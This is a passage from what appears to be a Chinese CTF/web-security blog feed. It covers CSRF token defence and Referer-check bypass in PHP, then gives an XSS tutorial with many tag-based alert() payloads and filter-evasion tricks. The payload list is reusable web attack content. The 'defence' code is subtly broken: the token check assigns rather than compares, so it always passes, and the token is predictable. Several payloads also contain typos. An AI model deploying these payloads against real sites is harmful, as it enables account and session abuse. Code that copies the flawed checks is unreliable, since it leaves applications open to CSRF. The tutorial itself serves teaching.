title="2.简单代码模型分析"></a>2.简单代码模型分析</h4><p><strong>登录验证<em>login.php</em></strong>（登录成功后，给与唯一令牌）——&gt;(登录成功执行操作，操作过程中有cookie提交的身份凭证)——&gt;（增删改部分给予令牌，并在提交操作时，提交令牌并进行验证。一般情况下，使用表单hidden进行提交，或者cookie）<strong>登录后执行操作（增删改查）</strong>——&gt;(没有登录成功执行操作自动跳回登录)——&gt;<strong>登录验证login.php</strong></p><p>远程构造CSRF利用POC，那么直接中招。如果利用在增删改查中设置唯一令牌，执行操作时只有提交令牌才能操作的话，就可以有效防止CSRF。如果令牌不正确，那么不执行操作，并给出提示内容。</p><h4 id="3-生成Token代码分析"><a href="#3-生成Token代码分析" class="headerlink" title="3.生成Token代码分析"></a>3.生成Token代码分析</h4><p>Token作为识别操作是否是当前用户自己操作的唯一凭证，需要设置为复杂难以被破解的内容。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">generateToken</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$salt</span> = <span class="string">&quot;bhjvfhtdjsdzxdvn&quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;h:i:s&quot;</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">generateToken</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4-使用Token进行CSRF漏洞防御"><a href="#4-使用Token进行CSRF漏洞防御" class="headerlink" title="4.使用Token进行CSRF漏洞防御"></a>4.使用Token进行CSRF漏洞防御</h4><ol><li>登录验证成功后，在会话SESSION[“user_token”]中保存token</li><li>在后台操作中，增删改表单中添加hidden，设置value为token</li><li>提交之后进行验证Token是否正确</li></ol><p>简单代码演示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">generateToken</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$salt</span> = <span class="string">&quot;bhjvfhtdjsdzxdvn&quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;h:i:sa&quot;</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">generateToken</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user_token&quot;</span>] = <span class="variable">$token</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;CSRF_TOKEN&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;CSRF_TOKEN&lt;/h1&gt;</span><br><span class="line">            &lt;form action=<span class="string">&quot;check.php &quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;text&quot;</span> value=<span class="string">&quot;我提交了！&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;user_token&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$token</span>; ?&gt;&quot;</span>&gt;</span><br><span class="line">                &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$user_token</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_token&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;user_token&quot;</span>] = <span class="variable">$user_token</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;successful&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/3.png"></p><p><img src="/imgs/4.png"></p><h2 id="5-CSRF绕过Referer技巧"><a href="#5-CSRF绕过Referer技巧" class="headerlink" title="5.CSRF绕过Referer技巧"></a>5.CSRF绕过Referer技巧</h2><h4 id="1-Referer防御CSRF原理"><a href="#1-Referer防御CSRF原理" class="headerlink" title="1.Referer防御CSRF原理"></a>1.Referer防御CSRF原理</h4><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p><p>当用户点击被构造好的CSRF利用页面，那么在执行用户对应操作时，提交HTTP请求中就有对应的Referer值，此时服务端判断Referer值是否与服务器的域名信息有关，如果不相关则不执行操作。</p><h4 id="2-Referer防御代码编写"><a href="#2-Referer防御代码编写" class="headerlink" title="2.Referer防御代码编写"></a>2.Referer防御代码编写</h4><p>在PHP中使用$_SERVER[‘HTTP_REFERER’]获取页面提交请求中的Referer值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>],<span class="string">&#x27;xx.com&#x27;</span>)!=<span class="literal">false</span>)&#123;</span><br><span class="line">        判断成功</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       失败</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-绕过Referer技巧"><a href="#3-绕过Referer技巧" class="headerlink" title="3.绕过Referer技巧"></a>3.绕过Referer技巧</h4><p>如果服务端只判断当前Referer中是否具有域名，那么直接可以新建文件进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$referer</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$referer</span>,<span class="string">&#x27;192.168.0.103&#x27;</span>)!=<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;successful&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/2.jpg"></p><h4 id="4-Burpsutie自动生成POC"><a href="#4-Burpsutie自动生成POC" class="headerlink" title="4.Burpsutie自动生成POC"></a>4.Burpsutie自动生成POC</h4><p><img src="/imgs/5.png"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS（跨站脚本攻击）</title>
      <link href="/2023/01/14/XSS/"/>
      <url>/2023/01/14/XSS/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h1><h2 id="1-什么是XSS"><a href="#1-什么是XSS" class="headerlink" title="1.什么是XSS"></a>1.什么是XSS</h2><p>XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS。这是一种将任意 Javascript 代码插入到其他Web用户页面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里嵌入恶意代码。当用户浏览改页时，这些潜入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie窃取等。</p><hr><h2 id="2-XSS的类型"><a href="#2-XSS的类型" class="headerlink" title="2.XSS的类型"></a>2.XSS的类型</h2><p>XSS类型一般分为三种：</p><h6 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h6><p>反射型XSS只是简单的把用户输入的数据“反射”给浏览器，也就是需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型XSS也叫作“非持久性XSS”。</p><p>漏洞产生原因一般是网站只是简单地将用户输入的数据直接或未经过完善的安全过滤就在浏览器中进行输岀，导致输岀的欻据中存在可被浏览器执行的代码数据。</p><h6 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2.存储型XSS"></a>2.存储型XSS</h6><p>存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性，当再次访问页面时会被执行。造成漏洞原因一般是由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中。</p><h6 id="3-DOM-Based-XSS"><a href="#3-DOM-Based-XSS" class="headerlink" title="3.DOM Based XSS"></a>3.DOM Based XSS</h6><p>实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分的，从效果上来说也是反射型XSS单独划分出来的，因为DOM Based XSS的形成原因比较特别。这是由于客户端脚本自身解析不正确导致的安全问题。这种利用也需要受害者点击链接来触发，DOM型XSS是前端代码中存在了漏洞，而反射型是后端代码中存在了漏洞。反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，在dom xss中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。</p><hr><h2 id="3-XSS危害"><a href="#3-XSS危害" class="headerlink" title="3.XSS危害"></a>3.XSS危害</h2><ul><li><p>流量劫持，利用木马修改浏览器不停的弹出新的窗口强制性的让用户访问指定的网站，为指定网站增加流量</p></li><li><p>获取用户cookie信息，盗取账号（普通用户、管理员等账号）</p></li><li><p>篡改、删除页面信息（钓鱼操作）</p></li><li><p>配合CSRF攻击，实施进一步的攻击，控制被害人的电脑访问其他网站</p></li></ul><hr><h2 id="4-XSS常见出现的地方"><a href="#4-XSS常见出现的地方" class="headerlink" title="4.XSS常见出现的地方"></a>4.XSS常见出现的地方</h2><h6 id="1-数据交互的地方"><a href="#1-数据交互的地方" class="headerlink" title="1.数据交互的地方"></a>1.数据交互的地方</h6><ul><li><p>get、post、cookies、headers</p></li><li><p>反馈与浏览</p></li><li><p>富文本编辑器</p></li><li><p>各类标签插入和自定义</p></li></ul><h6 id="2、数据输出的地方"><a href="#2、数据输出的地方" class="headerlink" title="2、数据输出的地方"></a>2、数据输出的地方</h6><ul><li><p>用户资料</p></li><li><p>关键词、标签、说明</p></li><li><p>文件上传</p></li></ul><h3 id="5-常见标签"><a href="#5-常见标签" class="headerlink" title="5.常见标签"></a>5.常见标签</h3><h5 id="1-lt-img-gt-标签"><a href="#1-lt-img-gt-标签" class="headerlink" title="1.&lt;img&gt;标签"></a>1.<code>&lt;img&gt;</code>标签</h5><h6 id="利用方式1"><a href="#利用方式1" class="headerlink" title="利用方式1"></a>利用方式1</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(String.formCharCode(88,83,83))</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">scr</span>=<span class="string">&quot;URL&quot;</span><span class="attr">style</span>=<span class="string">&#x27;Xss:expression(alert(/xss));&#x27;</span></span></span><br></pre></td></tr></table></figure><blockquote><!--CSS标记xss--><p><code>img STYLE=&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;</code></p></blockquote><h6 id="XSS利用方式2"><a href="#XSS利用方式2" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;<span class="attr">alert</span>(&#x27;<span class="attr">xss</span>&#x27;)&quot;)&gt;</span></span><br></pre></td></tr></table></figure><p>XSS利用方式3</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><h5 id="2-lt-a-gt-标签"><a href="#2-lt-a-gt-标签" class="headerlink" title="2.&lt;a&gt;标签"></a>2.<code>&lt;a&gt;</code>标签</h5><h6 id="标准格式"><a href="#标准格式" class="headerlink" title="标准格式"></a>标准格式</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span>&gt;</span>baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="XSS利用方式1"><a href="#XSS利用方式1" class="headerlink" title="XSS利用方式1"></a>XSS利用方式1</h6><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:aaa&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h6 id="XSS利用方式2-1"><a href="#XSS利用方式2-1" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h6><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h6 id="利用方式3"><a href="#利用方式3" class="headerlink" title="利用方式3"></a>利用方式3</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span><span class="attr">onclick</span>=<span class="string">eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="利用方式4"><a href="#利用方式4" class="headerlink" title="利用方式4"></a>利用方式4</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">kycg.asp?ttt</span>=<span class="string">1000</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;)<span class="attr">y</span>=<span class="string">2016</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="3-input标签"><a href="#3-input标签" class="headerlink" title="3.input标签"></a>3.input标签</h5><h6 id="标准格式-1"><a href="#标准格式-1" class="headerlink" title="标准格式"></a>标准格式</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="利用方式1-1"><a href="#利用方式1-1" class="headerlink" title="利用方式1"></a>利用方式1</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span><span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)<span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="利用方式2"><a href="#利用方式2" class="headerlink" title="利用方式2"></a>利用方式2</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span><span class="attr">value</span>=<span class="string">&quot;&quot;</span><span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;)<span class="attr">bad</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="利用方式4-1"><a href="#利用方式4-1" class="headerlink" title="利用方式4"></a>利用方式4</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span><span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="4-lt-form-gt-标签"><a href="#4-lt-form-gt-标签" class="headerlink" title="4.&lt;form&gt;标签"></a>4.<code>&lt;form&gt;</code>标签</h5><h6 id="XSS利用方式1-1"><a href="#XSS利用方式1-1" class="headerlink" title="XSS利用方式1"></a>XSS利用方式1</h6><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)<span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h6 id="XSS利用方式2-2"><a href="#XSS利用方式2-2" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h6><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">postaction</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">postaction</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>)&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h6 id="XSS利用方式3"><a href="#XSS利用方式3" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h6><blockquote><!--原code--><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">postaction</span>=<span class="string">&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><!--base64编码--><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">postaction</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h5 id="5-lt-iframe-gt-标签"><a href="#5-lt-iframe-gt-标签" class="headerlink" title="5.&lt;iframe&gt;标签"></a>5.<code>&lt;iframe&gt;</code>标签</h5><h6 id="XSS利用方式1-2"><a href="#XSS利用方式1-2" class="headerlink" title="XSS利用方式1"></a>XSS利用方式1</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);<span class="attr">height</span>=<span class="string">5width</span>=<span class="string">1000/</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="XSS利用方式2-3"><a href="#XSS利用方式2-3" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><!--原code--><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><!--base64编码--><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="XSS利用方式3-1"><a href="#XSS利用方式3-1" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;aaa&quot;</span><span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)/&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="XSS利用方式3-2"><a href="#XSS利用方式3-2" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:prompt(`xss`)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="6-svg-lt-gt-标签"><a href="#6-svg-lt-gt-标签" class="headerlink" title="6.svg&lt;&gt;标签"></a>6.<code>svg&lt;&gt;</code>标签</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sv</span> <span class="attr">gonload</span>=<span class="string">alert(1)</span>&gt;</span>﻿</span><br></pre></td></tr></table></figure><h2 id="6-XSS绕过"><a href="#6-XSS绕过" class="headerlink" title="6.XSS绕过"></a>6.XSS绕过</h2><h6 id="大小写绕过："><a href="#大小写绕过：" class="headerlink" title="大小写绕过："></a>大小写绕过：</h6><p>HTML对标签大小写不敏感，可以利用大小写混用绕过， 例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">改为<span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><h6 id="双写绕过："><a href="#双写绕过：" class="headerlink" title="双写绕过："></a>双写绕过：</h6><p>有些情况的规则会将黑名单标签替换为空，可以利用这一点构造标签，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">改为&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span>ipt&gt;</span></span></span><br></pre></td></tr></table></figure><p>同理某些注释符在规则中也会替换为空，这时候可以利用它构造payload，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">改为&lt;scr<span class="comment">&lt;!---test---&gt;</span>ipt&gt;</span></span></span><br></pre></td></tr></table></figure><h6 id="开口标签："><a href="#开口标签：" class="headerlink" title="开口标签："></a>开口标签：</h6><p>在某些特殊环境，由于html代码补全机制，可以故意不闭合标签绕过黑名单检测，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span 